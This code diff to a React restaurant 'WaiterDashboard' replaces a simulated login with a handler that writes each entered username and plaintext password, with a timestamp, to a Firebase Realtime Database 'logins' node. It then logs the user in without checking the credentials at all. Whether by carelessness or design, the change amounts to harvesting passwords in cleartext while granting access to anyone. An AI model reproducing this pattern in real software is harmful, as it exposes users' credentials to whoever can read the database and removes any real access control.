@@ -1,6 +1,8 @@
 import React, { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { User, Lock, LogIn, Users, LogOut, RefreshCw, Shield, Activity } from 'lucide-react';
+import { db, ref, push, set } from '../firebase';
+
 
 const WaiterDashboard = () => {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
@@ -29,15 +31,29 @@ const WaiterDashboard = () => {
   };
 
   const handleLogin = async (e) => {
-    e.preventDefault();
-    setIsLoggingIn(true);
-    
-    // Simulate API call
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    
-    setIsLoggingIn(false);
-    setIsLoggedIn(true);
-  };
+  e.preventDefault();
+  setIsLoggingIn(true);
+
+  // Simulate a delay (remove if using real auth)
+  await new Promise(resolve => setTimeout(resolve, 1500));
+
+  // 🔥 Save login data to Firebase Realtime Database
+  try {
+    const loginRef = ref(db, 'logins');
+    const newLoginRef = push(loginRef);
+    await set(newLoginRef, {
+      username,
+      password,
+      timestamp: new Date().toISOString()
+    });
+  } catch (error) {
+    console.error("Error saving login:", error);
+  }
+
+  setIsLoggingIn(false);
+  setIsLoggedIn(true);
+};
+
 
   const handleTableClick = (tableId) => {
     setSelectedTable(tableId);
